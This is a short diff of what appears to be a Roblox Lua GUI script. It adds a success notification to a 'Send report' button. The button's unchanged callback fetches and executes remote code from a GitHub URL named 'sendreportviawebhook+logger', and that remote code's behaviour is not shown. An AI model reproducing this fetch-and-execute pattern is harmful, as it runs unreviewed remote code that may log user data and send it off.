@@ -68,6 +68,14 @@ Page4.Button({
 	Text = "Send report",
 	Callback = function(Value)
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/wowpkw/thingsimayneed/main/sendreportviawebhook%2Blogger"))();
+
+	game.StarterGui:SetCore(
+	"SendNotification",
+	{
+		Title = "Success!",
+		Text = "Successfully sent your Report via Webhook!",
+	}
+)
 	end,
 })
 
